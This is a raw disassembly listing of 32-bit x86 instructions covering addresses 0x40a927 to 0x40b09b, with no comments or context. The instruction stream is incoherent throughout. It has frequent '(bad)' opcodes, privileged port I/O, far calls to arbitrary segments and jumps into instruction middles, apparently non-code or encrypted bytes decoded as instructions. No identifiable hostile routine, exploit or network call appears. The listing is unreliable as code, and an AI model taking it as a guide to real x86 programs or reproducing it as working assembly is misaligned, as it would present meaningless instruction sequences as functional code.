  40a927:	addr16 jmp 0xb992c130
  40a92d:	lahf   
  40a92e:	dec    esi
  40a92f:	dec    ebp
  40a930:	cmp    cl,ch
  40a932:	jno    0x40a993
  40a934:	clc    
  40a935:	xchg   ebx,eax
  40a936:	cmp    BYTE PTR [ebx-0x54],cl
  40a939:	jo     0x40a8db
  40a93b:	lods   al,BYTE PTR ds:[esi]
  40a93c:	clc    
  40a93d:	add    dl,BYTE PTR [edx-0x70]
  40a940:	sbb    al,0xa5
  40a942:	pop    eax
  40a943:	mov    ecx,0x9412fcd0
  40a948:	rcr    DWORD PTR [edi],1
  40a94a:	jecxz  0x40a8fd
  40a94c:	and    dh,BYTE PTR [esi+0xa3e3f7d]
  40a952:	add    edi,DWORD PTR [ebp-0x188a0090]
  40a958:	jl     0x40a9bc
  40a95a:	aas    
  40a95b:	mov    ecx,0x96856d5a
  40a960:	or     ebx,DWORD PTR [ebp-0x75ffdb44]
  40a966:	sbb    al,0x2a
  40a968:	fdiv   DWORD PTR [esi-0x2c0948c4]
  40a96e:	jbe    0x40a96d
  40a970:	cdq    
  40a971:	popf   
  40a972:	test   DWORD PTR [esi],esp
  40a974:	aad    0xfc
  40a976:	dec    edx
  40a977:	ror    DWORD PTR [edi],cl
  40a979:	sub    DWORD PTR [ebx+0x33],0x1c41d9
  40a980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a981:	(bad)
  40a984:	out    dx,al
  40a985:	mov    WORD PTR [eax+eax*4+0x49195343],ds
  40a98c:	pop    esi
  40a98d:	sbb    ecx,edx
  40a98f:	pop    esi
  40a990:	fdiv   QWORD PTR [ecx+eiz*2-0x5d5dc9cb]
  40a997:	arpl   WORD PTR [ebx+ebp*2-0x4f7a59ae],sp
  40a99e:	add    edx,DWORD PTR [ecx+0x2a15df6f]
  40a9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a5:	add    eax,edx
  40a9a7:	mov    bl,0xbb
  40a9a9:	sbb    al,0x7f
  40a9ab:	out    0xbc,al
  40a9ad:	ins    BYTE PTR es:[edi],dx
  40a9ae:	(bad)  
  40a9af:	jae    0x40a9ea
  40a9b1:	pop    ebx
  40a9b2:	dec    ebx
  40a9b3:	js     0x40aa1c
  40a9b5:	(bad)  
  40a9b6:	out    dx,al
  40a9b7:	mov    al,ds:0xe7bf51c5
  40a9bc:	or     eax,0xd0cbb87f
  40a9c1:	push   edi
  40a9c2:	call   0xc75e:0xc3f7587a
  40a9c9:	pop    edx
  40a9ca:	lods   eax,DWORD PTR ds:[esi]
  40a9cb:	sbb    ebp,DWORD PTR [esi+0x27]
  40a9ce:	sbb    eax,0x5b6ae148
  40a9d3:	sub    BYTE PTR [edx+ecx*1-0x5690cace],al
  40a9da:	ins    BYTE PTR es:[edi],dx
  40a9db:	adc    BYTE PTR [ebp+0x2b11330e],dl
  40a9e1:	push   esp
  40a9e2:	pop    es
  40a9e3:	sti    
  40a9e4:	add    BYTE PTR [eax+0x68],cl
  40a9e7:	and    ebp,ebx
  40a9e9:	std    
  40a9ea:	pop    ss
  40a9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9ec:	(bad)  
  40a9ed:	retf   0xa3f9
  40a9f0:	sbb    BYTE PTR [ebx],bh
  40a9f2:	xchg   ebp,eax
  40a9f3:	xlat   BYTE PTR ds:[ebx]
  40a9f4:	retf   
  40a9f5:	aad    0x26
  40a9f7:	xor    bh,BYTE PTR [edx+0x12]
  40a9fa:	jnp    0x40a9b9
  40a9fc:	cmp    ch,ch
  40a9fe:	cwde   
  40a9ff:	or     ch,BYTE PTR [esi-0x7e]
  40aa02:	mov    esi,eax
  40aa04:	pop    es
  40aa05:	lahf   
  40aa06:	inc    esi
  40aa07:	inc    esi
  40aa08:	bound  esi,QWORD PTR [ecx+0x4c8c6880]
  40aa0e:	inc    bl
  40aa10:	push   ss
  40aa11:	adc    edx,DWORD PTR [eax]
  40aa13:	ins    BYTE PTR es:[edi],dx
  40aa14:	test   al,0xac
  40aa16:	outs   dx,BYTE PTR ds:[esi]
  40aa17:	lods   eax,DWORD PTR ds:[esi]
  40aa18:	adc    ah,BYTE PTR [ecx]
  40aa1a:	repz pusha 
  40aa1c:	outs   dx,DWORD PTR ds:[esi]
  40aa1d:	repz xchg esi,eax
  40aa1f:	jecxz  0x40aa57
  40aa21:	dec    edi
  40aa22:	xchg   esi,eax
  40aa23:	arpl   WORD PTR [edx],cx
  40aa25:	mov    BYTE PTR [edi+ecx*1-0x19],dl
  40aa29:	jl     0x40a9ab
  40aa2b:	dec    esi
  40aa2c:	int3   
  40aa2d:	jecxz  0x40a9f1
  40aa2f:	(bad)  
  40aa30:	jo     0x40aa08
  40aa32:	in     eax,0x3c
  40aa34:	xchg   esi,eax
  40aa35:	and    ebp,DWORD PTR [edx+0x5211d5f1]
  40aa3b:	ret    0x8230
  40aa3e:	in     al,0x9e
  40aa40:	rcl    DWORD PTR [esi-0x3e0037a5],1
  40aa46:	arpl   WORD PTR [ecx+edx*1],bp
  40aa49:	lods   eax,DWORD PTR ds:[esi]
  40aa4a:	sbb    BYTE PTR [edi],cl
  40aa4c:	fistp  WORD PTR [eax+edx*1-0x3b]
  40aa50:	(bad)  
  40aa51:	dec    edi
  40aa52:	xchg   ecx,eax
  40aa53:	out    0x2d,al
  40aa55:	mov    edi,0x503009cd
  40aa5a:	sbb    DWORD PTR [esi+0x149a402a],eax
  40aa60:	cmp    eax,0x71347609
  40aa65:	test   DWORD PTR [edi],eax
  40aa67:	xchg   ebp,eax
  40aa68:	retf   0x562c
  40aa6b:	xor    BYTE PTR [edi+esi*2+0x2c],ah
  40aa6f:	mov    al,ds:0x23064ce3
  40aa74:	and    BYTE PTR [ebx+0x2eb25736],cl
  40aa7a:	inc    ebp
  40aa7b:	sbb    eax,0xbb895b47
  40aa80:	(bad)  
  40aa81:	pop    ds
  40aa82:	sub    BYTE PTR [ecx+edi*1],dl
  40aa85:	ret    
  40aa86:	sbb    ch,BYTE PTR [eax-0x13]
  40aa89:	add    bh,bl
  40aa8b:	inc    eax
  40aa8c:	ret    
  40aa8d:	sub    DWORD PTR [esi+0x7d51b77c],0x414dfdb7
  40aa97:	mov    DWORD PTR [edi-0x13f29a01],esp
  40aa9d:	aam    0xcb
  40aa9f:	xchg   ebx,eax
  40aaa0:	call   0x3b5eabae
  40aaa5:	repz pop ds
  40aaa7:	popf   
  40aaa8:	fimul  DWORD PTR [edi+0x55]
  40aaab:	sbb    eax,0xb449e3dd
  40aab0:	jp     0x40aad3
  40aab2:	mov    ds:0xd4b09237,al
  40aab7:	and    bl,BYTE PTR [edx+0x7c]
  40aaba:	jl     0x40aadc
  40aabc:	ds out dx,eax
  40aabe:	gs adc BYTE PTR cs:[ebx*1+0x2462a4fb],bl
  40aac7:	or     DWORD PTR [esi+0x7e],edx
  40aaca:	xchg   esi,eax
  40aacb:	(bad)  
  40aacc:	jg     0x40aae2
  40aace:	sub    al,0xea
  40aad0:	dec    esp
  40aad1:	xchg   ebp,eax
  40aad2:	xlat   BYTE PTR ds:[ebx]
  40aad3:	xchg   ecx,eax
  40aad4:	sbb    al,0xd4
  40aad6:	sbb    edi,ecx
  40aad8:	(bad)  
  40aad9:	sbb    BYTE PTR [ebx],ah
  40aadb:	jb     0x40aad5
  40aadd:	pop    edi
  40aade:	test   DWORD PTR [ecx-0x75],edi
  40aae1:	out    dx,al
  40aae2:	(bad)  
  40aae3:	in     eax,dx
  40aae4:	cmp    DWORD PTR [ebp-0x61],edi
  40aae7:	(bad)  
  40aae8:	lahf   
  40aae9:	out    0xea,eax
  40aaeb:	cmp    esi,DWORD PTR [esi+0x1e1a0fe1]
  40aaf1:	imul   edx,edi,0x114f16fd
  40aaf7:	dec    esi
  40aaf8:	loopne 0x40aaee
  40aafa:	and    eax,0xe3cf4846
  40aaff:	loopne 0x40ab71
  40ab01:	iret   
  40ab02:	pop    edx
  40ab03:	and    DWORD PTR [edi-0x750a77f2],esp
  40ab09:	pop    esp
  40ab0a:	mov    dl,0xa
  40ab0c:	jns    0x40ab36
  40ab0e:	mov    esp,0x43f59e07
  40ab13:	xchg   eax,esp
  40ab15:	pop    esi
  40ab16:	jecxz  0x40aa99
  40ab18:	call   0xeb5404
  40ab1d:	lock jns 0x40aaab
  40ab20:	push   ecx
  40ab21:	and    DWORD PTR [edi+0x2c],edx
  40ab24:	call   0x16f3:0x7884b2f6
  40ab2b:	push   ebp
  40ab2c:	jle    0x40ab04
  40ab2e:	fs cs add DWORD PTR ds:[ebp+0x16fc72db],ecx
  40ab37:	call   0x2252:0xd8b526ac
  40ab3e:	imul   ecx,DWORD PTR [eax+0x7c],0x7f8bbcbb
  40ab45:	loope  0x40ab76
  40ab47:	xchg   esi,eax
  40ab48:	xchg   esp,eax
  40ab49:	jns    0x40aba3
  40ab4b:	aas    
  40ab4c:	xor    eax,esi
  40ab4e:	ds (bad) 
  40ab50:	jge    0x40ab70
  40ab52:	inc    esp
  40ab53:	std    
  40ab54:	jp     0x40ab00
  40ab56:	rcl    DWORD PTR [esi-0x19],0x2
  40ab5a:	xchg   al,ch
  40ab5c:	xor    DWORD PTR [eax],edi
  40ab5e:	(bad)  
  40ab5f:	inc    esi
  40ab60:	test   BYTE PTR [eax+0x276ca6c9],al
  40ab66:	and    BYTE PTR [ebx+0x63],0x50
  40ab6a:	jnp    0x40ab9b
  40ab6c:	add    ah,BYTE PTR [ebx+0x62]
  40ab6f:	(bad)  
  40ab70:	loope  0x40abeb
  40ab72:	imul   ebp,DWORD PTR [ebx],0xfeb9bd74
  40ab78:	xor    bl,ch
  40ab7a:	mov    ah,BYTE PTR cs:[ebp+ebp*1-0x55]
  40ab7f:	add    ch,BYTE PTR [ebp-0x7df9202f]
  40ab85:	gs fs loope 0x40abce
  40ab89:	retf   0xd087
  40ab8c:	dec    ebp
  40ab8d:	xor    eax,0xc1aea36e
  40ab92:	dec    ebp
  40ab93:	xor    dl,BYTE PTR [ebp+0xeb77f3f]
  40ab99:	mov    dl,0x5f
  40ab9b:	jo     0x40aba5
  40ab9d:	jle    0x40ab95
  40ab9f:	fistp  DWORD PTR [eax]
  40aba1:	int    0xff
  40aba3:	mov    bl,0xfd
  40aba5:	test   eax,0xe7eac56d
  40abaa:	fsubr  DWORD PTR [esi+0x1810b88c]
  40abb0:	inc    esp
  40abb1:	dec    edx
  40abb2:	ins    BYTE PTR es:[edi],dx
  40abb3:	mov    dh,0x58
  40abb5:	xchg   edi,eax
  40abb6:	or     BYTE PTR [ebx],dh
  40abb8:	test   ch,bh
  40abba:	jno    0x40ac1e
  40abbc:	dec    DWORD PTR [edi]
  40abbe:	retf   0x1346
  40abc1:	jne    0x40ac06
  40abc3:	mov    dh,0x74
  40abc5:	shr    BYTE PTR [edi+eiz*4-0x5a],0x68
  40abca:	push   ebp
  40abcb:	xchg   ecx,eax
  40abcc:	mov    ecx,0xdf1ac664
  40abd1:	or     edx,DWORD PTR ds:0xe6c45ef2
  40abd7:	test   al,0xd4
  40abd9:	clc    
  40abda:	popa   
  40abdb:	mov    ds:0x7f3f9f3c,al
  40abe0:	aad    0x9e
  40abe2:	mov    al,ds:0x3f5b23a5
  40abe7:	pop    eax
  40abe8:	mov    al,0xbb
  40abea:	or     al,0xce
  40abec:	pushf  
  40abed:	sbb    al,BYTE PTR [ebx-0x6]
  40abf0:	repnz push edi
  40abf2:	sub    BYTE PTR [esi-0x1b54df50],ah
  40abf8:	xchg   BYTE PTR [esi],bh
  40abfa:	mov    esi,0x8cb5dc2a
  40abff:	and    BYTE PTR [ecx-0x15],bh
  40ac02:	push   cs
  40ac03:	daa    
  40ac04:	and    al,0xdd
  40ac06:	and    BYTE PTR [esi],ah
  40ac08:	mov    bh,0x39
  40ac0a:	inc    esi
  40ac0b:	or     BYTE PTR [ebp+0x55],cl
  40ac0e:	dec    ecx
  40ac0f:	mov    ch,BYTE PTR [ebx-0x6b3febce]
  40ac15:	inc    edx
  40ac16:	repnz test al,0xd6
  40ac19:	push   edi
  40ac1a:	jbe    0x40ac98
  40ac1c:	xchg   BYTE PTR [esi-0x64],dh
  40ac1f:	sub    eax,0x49febbe6
  40ac25:	daa    
  40ac26:	arpl   di,sp
  40ac28:	cmp    ebp,DWORD PTR [edi+0x5ef64f81]
  40ac2e:	jne    0x40abcb
  40ac30:	lea    esi,[eiz*1+0x222454f9]
  40ac37:	mov    DWORD PTR [edi-0x2c],ecx
  40ac3a:	mov    esp,0x2b80cf10
  40ac3f:	xchg   edx,eax
  40ac40:	mov    ah,0x5
  40ac42:	adc    eax,0xd464362b
  40ac47:	jo     0x40acc8
  40ac49:	test   al,0x75
  40ac4b:	push   esp
  40ac4c:	adc    bl,bl
  40ac4e:	xchg   BYTE PTR [eax],al
  40ac50:	out    0x3b,eax
  40ac52:	out    0x3e,al
  40ac54:	mov    ch,BYTE PTR [eax-0x1e]
  40ac57:	dec    edx
  40ac58:	push   ds
  40ac59:	in     al,dx
  40ac5a:	lods   al,BYTE PTR ds:[esi]
  40ac5b:	cwde   
  40ac5c:	das    
  40ac5d:	jns    0x40ac0c
  40ac5f:	lods   eax,DWORD PTR ds:[esi]
  40ac60:	sbb    al,BYTE PTR [eax+ebp*2+0x5f1e56ab]
  40ac67:	jl     0x40ac4e
  40ac69:	mov    ds:0x36338b3d,al
  40ac6e:	cli    
  40ac6f:	add    ch,BYTE PTR [edx-0x195bbd4]
  40ac75:	(bad)  
  40ac76:	adc    ecx,eax
  40ac78:	clc    
  40ac79:	clc    
  40ac7a:	(bad)  
  40ac7b:	ja     0x40ace0
  40ac7d:	inc    esp
  40ac7e:	mov    dh,0xac
  40ac80:	lods   al,BYTE PTR ds:[esi]
  40ac81:	fwait
  40ac82:	shr    DWORD PTR [ecx+0x25bd4718],0xc7
  40ac89:	test   DWORD PTR [esi-0x1a],ebx
  40ac8c:	sbb    BYTE PTR [ebx],0x1b
  40ac8f:	inc    esi
  40ac90:	enter  0x2659,0xc2
  40ac94:	adc    cl,ah
  40ac96:	into   
  40ac97:	mov    bh,0xb0
  40ac99:	push   ss
  40ac9a:	jo     0x40aca2
  40ac9c:	jp     0x40acb4
  40ac9e:	imul   edi,DWORD PTR [edi],0x10
  40aca1:	(bad)  
  40aca2:	in     eax,0x2f
  40aca4:	jmp    0xc18a8a19
  40aca9:	jne    0x40ac5d
  40acab:	or     ch,BYTE PTR [eax+0x7cbb266a]
  40acb1:	dec    esp
  40acb2:	jae    0x40ad1b
  40acb4:	or     edi,DWORD PTR [edx]
  40acb6:	xchg   DWORD PTR [eax+0x60],esi
  40acb9:	in     al,0x62
  40acbb:	lds    esi,FWORD PTR [ebx]
  40acbd:	xor    cl,BYTE PTR [ebx-0x1256e192]
  40acc3:	inc    ebp
  40acc4:	test   al,0x13
  40acc6:	xor    eax,0x72df2121
  40accb:	int    0xc8
  40accd:	sbb    bl,dh
  40accf:	jno    0x40ad46
  40acd1:	cmp    dh,BYTE PTR [eax-0x23]
  40acd4:	push   edi
  40acd5:	pop    ds
  40acd6:	aas    
  40acd7:	cmp    eax,DWORD PTR [edx-0x6e14f6f2]
  40acdd:	xor    al,0xb6
  40acdf:	ret    0xe093
  40ace2:	jbe    0x40ac75
  40ace4:	sbb    BYTE PTR [eax+0x2c8d243],0xeb
  40aceb:	ins    DWORD PTR es:[edi],dx
  40acec:	fild   QWORD PTR ds:0x96e4b02c
  40acf2:	cmp    eax,0x8de77650
  40acf7:	mov    DWORD PTR [edx+0x30],edx
  40acfa:	mov    ebx,DWORD PTR [edi+0x49dd9709]
  40ad00:	(bad)  [ecx]
  40ad02:	cmp    esi,DWORD PTR [edi+0x637c3a2f]
  40ad08:	ins    DWORD PTR es:[edi],dx
  40ad09:	out    dx,eax
  40ad0a:	sahf   
  40ad0b:	jnp    0x40ac8d
  40ad0d:	mov    esi,0x8cb80cf7
  40ad12:	cmp    DWORD PTR ds:0x1596a98c,eax
  40ad18:	popf   
  40ad19:	sbb    edx,ebp
  40ad1b:	addr16 out 0x48,al
  40ad1e:	sbb    BYTE PTR [ebx+0x732a08b],bl
  40ad24:	out    0x2e,eax
  40ad26:	imul   edx,DWORD PTR [eax+ecx*8-0x738951e],0xffffffc4
  40ad2e:	aas    
  40ad2f:	pusha  
  40ad30:	mov    eax,ds:0x4335007f
  40ad35:	xchg   esi,eax
  40ad36:	sub    ecx,ebp
  40ad38:	mov    bh,0x44
  40ad3a:	adc    ebp,DWORD PTR [ebx]
  40ad3c:	fist   WORD PTR [edx-0x19]
  40ad3f:	idiv   BYTE PTR gs:[ebx+0x12]
  40ad43:	imul   esi,DWORD PTR [ecx],0x70b51151
  40ad49:	mov    es,WORD PTR [esi-0x2f3a22f]
  40ad4f:	adc    DWORD PTR [eax+0x16],edx
  40ad52:	and    eax,0xb0ecf9fc
  40ad57:	and    eax,0x6a5f9ee9
  40ad5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad5d:	je     0x40ad4b
  40ad5f:	out    dx,eax
  40ad60:	xor    DWORD PTR [esi+eiz*4],ecx
  40ad63:	cmp    eax,0x4deb9255
  40ad68:	fnstcw WORD PTR [eax-0x71]
  40ad6b:	xchg   esp,eax
  40ad6c:	xor    al,0x1e
  40ad6e:	jge    0x40ade1
  40ad70:	loopne 0x40addc
  40ad72:	xchg   ecx,eax
  40ad73:	pop    eax
  40ad74:	scas   eax,DWORD PTR es:[edi]
  40ad75:	pop    es
  40ad76:	ret    
  40ad77:	mov    eax,0x65e6cebf
  40ad7c:	icebp  
  40ad7d:	jl     0x40adef
  40ad7f:	test   BYTE PTR [edx+0xa],ch
  40ad82:	test   al,0x2c
  40ad84:	daa    
  40ad85:	adc    bl,dh
  40ad87:	jae    0x40adc1
  40ad89:	jnp    0x40ad28
  40ad8b:	adc    cl,BYTE PTR es:[edx+0x75]
  40ad8f:	dec    edi
  40ad90:	mov    eax,0x3d79f9f4
  40ad95:	jne    0x40adf6
  40ad97:	sub    eax,0xc16fc596
  40ad9c:	and    eax,0xf88ee1e4
  40ada1:	aaa    
  40ada2:	pusha  
  40ada3:	popf   
  40ada4:	sbb    al,dh
  40ada6:	(bad)  
  40ada7:	clc    
  40ada8:	ds jle 0x40ad8d
  40adab:	push   esp
  40adac:	pop    ds
  40adad:	inc    edi
  40adae:	pushf  
  40adaf:	add    BYTE PTR [ecx+0x67409aa1],0xeb
  40adb6:	or     eax,0x95b9dfd
  40adbb:	mov    bh,BYTE PTR [esi-0x22]
  40adbe:	sub    al,0x96
  40adc0:	jg     0x40add4
  40adc2:	add    al,0xc2
  40adc4:	mov    al,0x7e
  40adc6:	sbb    edx,DWORD PTR [edi+0x6e]
  40adc9:	adc    eax,0xfa7482b9
  40adce:	sahf   
  40adcf:	mov    al,0x7d
  40add1:	repnz ins BYTE PTR es:[edi],dx
  40add3:	loope  0x40ae31
  40add5:	add    eax,0xd8f804ad
  40adda:	xchg   ecx,eax
  40addb:	jle    0x40addf
  40addd:	pop    eax
  40adde:	inc    eax
  40addf:	jecxz  0x40adfd
  40ade1:	dec    ecx
  40ade2:	sar    ah,1
  40ade4:	popa   
  40ade5:	mov    esi,0x2b434465
  40adea:	push   es
  40adeb:	push   edi
  40adec:	inc    ecx
  40aded:	test   BYTE PTR [esi+0x65],ah
  40adf0:	fwait
  40adf1:	dec    eax
  40adf2:	dec    edi
  40adf3:	pop    esp
  40adf4:	loop   0x40ad82
  40adf6:	push   ss
  40adf7:	mov    ebx,0x80e3e1a
  40adfc:	jle    0x40adb2
  40adfe:	lahf   
  40adff:	dec    ebx
  40ae00:	jmp    0x40ae5b
  40ae02:	iretw  
  40ae04:	loop   0x40ae1c
  40ae06:	mov    bh,0x78
  40ae08:	icebp  
  40ae09:	pop    esp
  40ae0a:	push   ebp
  40ae0b:	pop    esp
  40ae0c:	loopne 0x40ae5e
  40ae0e:	adc    al,0x9e
  40ae10:	arpl   bp,sp
  40ae12:	jmp    0x40adbe
  40ae14:	sti    
  40ae15:	ins    DWORD PTR es:[edi],dx
  40ae16:	xor    DWORD PTR [edx+0x33],edi
  40ae19:	jmp    0xf0ad726c
  40ae1e:	dec    edx
  40ae1f:	mov    DWORD PTR [ecx],esp
  40ae21:	ja     0x40addf
  40ae23:	xor    DWORD PTR [ecx-0x23eedc1],0xfe8acc6a
  40ae2d:	jno    0x40adf6
  40ae2f:	dec    esi
  40ae30:	jnp    0x40ae93
  40ae32:	or     eax,0x16f56553
  40ae37:	adc    ch,ah
  40ae39:	mov    bl,0x83
  40ae3b:	inc    esp
  40ae3c:	mov    ebx,0x3de9d8f2
  40ae41:	ds sub eax,0x47e04bbd
  40ae47:	push   edi
  40ae48:	rcr    eax,1
  40ae4a:	and    BYTE PTR [ebp-0x1d],ah
  40ae4d:	mov    ebx,esp
  40ae4f:	lods   al,BYTE PTR ds:[esi]
  40ae50:	call   0x2f8904b4
  40ae55:	cmp    BYTE PTR ds:0xa784c8ac,al
  40ae5b:	xlat   BYTE PTR gs:[ebx]
  40ae5d:	or     al,0x73
  40ae5f:	ins    BYTE PTR es:[edi],dx
  40ae60:	or     al,ch
  40ae62:	pop    eax
  40ae63:	cmc    
  40ae64:	ins    DWORD PTR es:[edi],dx
  40ae65:	mov    esp,0xa002fa7b
  40ae6a:	adc    al,0x54
  40ae6c:	stc    
  40ae6d:	outs   dx,DWORD PTR ds:[esi]
  40ae6e:	clc    
  40ae6f:	call   0x4ed0:0x3800ec89
  40ae76:	clc    
  40ae77:	outs   dx,DWORD PTR ds:[esi]
  40ae78:	push   esi
  40ae79:	dec    esi
  40ae7a:	sub    esi,esi
  40ae7c:	lods   eax,DWORD PTR ds:[esi]
  40ae7d:	jmp    0x4586:0xd9e72481
  40ae84:	mov    ds:0xbf89eff0,al
  40ae89:	(bad)  
  40ae8a:	dec    esp
  40ae8b:	jb     0x40ae3e
  40ae8d:	xchg   DWORD PTR [esi],ebp
  40ae8f:	mov    cl,0xb8
  40ae91:	aaa    
  40ae92:	sbb    eax,0x98a3e2c6
  40ae97:	ret    0x2db3
  40ae9a:	or     al,0x22
  40ae9c:	push   ds
  40ae9d:	lods   al,BYTE PTR ds:[esi]
  40ae9e:	xor    dh,cl
  40aea0:	xor    dh,dl
  40aea2:	jnp    0x40aea3
  40aea4:	pushf  
  40aea5:	dec    esp
  40aea6:	mov    cl,0x15
  40aea8:	mov    ch,0x98
  40aeaa:	cmc    
  40aeab:	inc    eax
  40aeac:	jno    0x40ae3f
  40aeae:	cmc    
  40aeaf:	leave  
  40aeb0:	arpl   WORD PTR [esi+esi*2-0x3f],ax
  40aeb4:	cmp    al,0xe
  40aeb6:	mov    ecx,0x39570c11
  40aebb:	cmp    BYTE PTR [edx+0x24755a0d],dl
  40aec1:	test   BYTE PTR [ecx+0x8],bh
  40aec4:	sbb    al,0xa4
  40aec6:	lods   eax,DWORD PTR ds:[esi]
  40aec7:	jae    0x40aeaa
  40aec9:	inc    ebp
  40aeca:	and    eax,0xb42da722
  40aecf:	fsubr  st,st(4)
  40aed1:	jno    0x40aea0
  40aed3:	inc    ecx
  40aed4:	int3   
  40aed5:	popf   
  40aed6:	lea    ebp,[edi-0x7f]
  40aed9:	jo     0x40aeb2
  40aedb:	cmp    DWORD PTR [eax-0x67],esp
  40aede:	fld    QWORD PTR [ecx]
  40aee0:	stos   BYTE PTR es:[edi],al
  40aee1:	shl    bh,cl
  40aee3:	pop    edi
  40aee4:	cmp    edi,eax
  40aee6:	call   0x6824ed7e
  40aeeb:	and    al,0xe6
  40aeed:	(bad)  
  40aeee:	push   0x76
  40aef0:	and    al,0x64
  40aef2:	fidivr WORD PTR [ebx+0x5977db9b]
  40aef8:	mov    ds:0xbb0b35a5,al
  40aefd:	jnp    0x40aee4
  40aeff:	sti    
  40af00:	cmp    BYTE PTR [edi+eiz*2-0x598e03b1],bl
  40af07:	out    0xb1,eax
  40af09:	ret    
  40af0a:	inc    esi
  40af0b:	mov    ecx,0x1e512da0
  40af10:	jns    0x40af74
  40af12:	or     DWORD PTR ds:0x9ecd9888,edi
  40af18:	in     al,dx
  40af19:	ja     0x40af75
  40af1b:	fs push ss
  40af1d:	(bad)  
  40af1e:	pop    ss
  40af1f:	dec    edx
  40af20:	xor    DWORD PTR ds:0x16efc824,ebx
  40af26:	add    al,0x6d
  40af28:	sub    al,0x39
  40af2a:	(bad)  
  40af2b:	fwait
  40af2c:	xor    esi,DWORD PTR [esi-0x12c104a8]
  40af32:	std    
  40af33:	les    edi,FWORD PTR [edi+0x1a]
  40af36:	push   ebp
  40af37:	sub    DWORD PTR [ebx-0x4a2b5cf9],edx
  40af3d:	imul   ecx,DWORD PTR [eax+0x439ad7f2],0x34
  40af44:	push   esi
  40af45:	ds aas 
  40af47:	test   BYTE PTR [esi+0x757d309a],dl
  40af4d:	mov    eax,0x9690b649
  40af52:	mov    ds:0x8bf21493,al
  40af57:	mov    dh,0xc7
  40af59:	ret    0x7e64
  40af5c:	inc    ebx
  40af5d:	js     0x40afc3
  40af5f:	push   ds
  40af60:	pop    ebp
  40af61:	and    ah,0xbe
  40af64:	lods   eax,DWORD PTR ds:[esi]
  40af65:	xchg   DWORD PTR [ecx-0xcfe570e],ecx
  40af6b:	mov    ebp,0xa71f4c9d
  40af70:	or     eax,0xc0cd42a0
  40af75:	cs mov eax,eax
  40af78:	aad    0xe1
  40af7a:	xor    al,0x90
  40af7c:	lds    eax,FWORD PTR [edi-0x23]
  40af7f:	or     DWORD PTR [ecx+0x7],eax
  40af82:	rcr    BYTE PTR [edx],0xfb
  40af85:	cmp    eax,0xc4cf9963
  40af8a:	pusha  
  40af8b:	inc    ebx
  40af8c:	loop   0x40afb2
  40af8e:	ret    
  40af8f:	fs pop esi
  40af91:	leave  
  40af92:	cmp    esp,ecx
  40af94:	fsubr  DWORD PTR [edi+0x5c]
  40af97:	push   0xffffff8b
  40af99:	ds aaa 
  40af9b:	jmp    DWORD PTR [edi]
  40af9d:	ins    BYTE PTR es:[edi],dx
  40af9e:	clc    
  40af9f:	mov    edx,DWORD PTR [edi-0x77]
  40afa2:	dec    ebp
  40afa3:	pop    edx
  40afa4:	mov    BYTE PTR [esi],al
  40afa6:	lods   al,BYTE PTR ds:[esi]
  40afa7:	and    edi,DWORD PTR [ebx]
  40afa9:	imul   ebx,DWORD PTR [edx-0x15],0x1b
  40afad:	ins    BYTE PTR es:[edi],dx
  40afae:	mov    ds:0xdafb1a0a,al
  40afb3:	inc    eax
  40afb4:	pop    ebp
  40afb5:	dec    esp
  40afb6:	push   es
  40afb7:	inc    eax
  40afb8:	xor    eax,0x8a599d85
  40afbd:	test   DWORD PTR [eax+0x3eacb745],edx
  40afc3:	popf   
  40afc4:	sub    bl,cl
  40afc6:	cmp    eax,0xd5b0cce8
  40afcb:	mov    ecx,0x405fde
  40afd0:	shl    BYTE PTR cs:[ecx],0x3e
  40afd4:	arpl   WORD PTR [edi+0x35],bp
  40afd7:	jns    0x40afc2
  40afd9:	mov    WORD PTR [eax+0x21bf9e3c],?
  40afdf:	jg     0x40b020
  40afe1:	xor    BYTE PTR [ecx-0x47578267],bh
  40afe7:	sub    dl,bh
  40afe9:	pop    ds
  40afea:	xor    eax,0xf0d8389c
  40afef:	imul   esi,DWORD PTR [ebx],0xc451cb89
  40aff5:	into   
  40aff6:	or     al,0x46
  40aff8:	sar    DWORD PTR [esi-0x5c934afe],1
  40affe:	mov    WORD PTR [edx+eiz*1],gs
  40b001:	shr    BYTE PTR [ebx+ebx*4-0x2a2eb66f],0x17
  40b009:	iret   
  40b00a:	cmp    bl,BYTE PTR [edi-0x5b]
  40b00d:	mov    DWORD PTR [ebp+0x36],ecx
  40b010:	retf   0x28c0
  40b013:	push   DWORD PTR [edi+0x66]
  40b016:	scas   al,BYTE PTR es:[edi]
  40b017:	sub    DWORD PTR [ebp+eiz*4-0x77],edi
  40b01b:	enter  0xb04b,0xe1
  40b01f:	xchg   DWORD PTR [edx],ebp
  40b021:	add    eax,0xdd04385
  40b026:	jns    0x40afe7
  40b028:	pop    esp
  40b029:	call   0x707834bb
  40b02e:	sub    BYTE PTR [ebp+0x26e46249],bh
  40b034:	cli    
  40b035:	cmp    eax,0xc8ffdb91
  40b03a:	cmp    BYTE PTR [ebx],0x59
  40b03d:	mov    ebx,0xee9b296a
  40b042:	pop    eax
  40b043:	ret    0xbeed
  40b046:	loope  0x40b086
  40b048:	aad    0xbe
  40b04a:	aaa    
  40b04b:	int3   
  40b04c:	pop    ecx
  40b04d:	call   0xe62c:0x9c341d36
  40b054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b055:	and    ebp,DWORD PTR [edx+edi*8-0x37486f62]
  40b05c:	cmp    DWORD PTR [ecx-0x2237b973],esi
  40b062:	cli    
  40b063:	inc    esi
  40b064:	pop    esi
  40b065:	jp     0x40b065
  40b067:	ret    
  40b068:	jmp    0x40b088
  40b06a:	and    al,0x42
  40b06c:	xchg   DWORD PTR [edx],edx
  40b06e:	jp     0x40b037
  40b070:	mov    bl,0x8c
  40b072:	push   es
  40b073:	daa    
  40b074:	aaa    
  40b075:	xchg   ebp,eax
  40b076:	call   0xf0c3:0x4af063c4
  40b07d:	ffree  st(2)
  40b07f:	int    0x71
  40b081:	mov    dh,0x78
  40b083:	aas    
  40b084:	xchg   DWORD PTR [eax],ebx
  40b086:	in     al,dx
  40b087:	xchg   edi,eax
  40b088:	add    al,0x67
  40b08a:	(bad)  
  40b08b:	mov    eax,ds:0x1c855813
  40b090:	xor    ch,al
  40b092:	jb     0x40b0ff
  40b094:	and    DWORD PTR [edi-0x7f],eax
  40b097:	out    0x6d,al
  40b099:	xor    ch,BYTE PTR [esi]
  40b09b:	xor    BYTE PTR [edi-0x53],dl
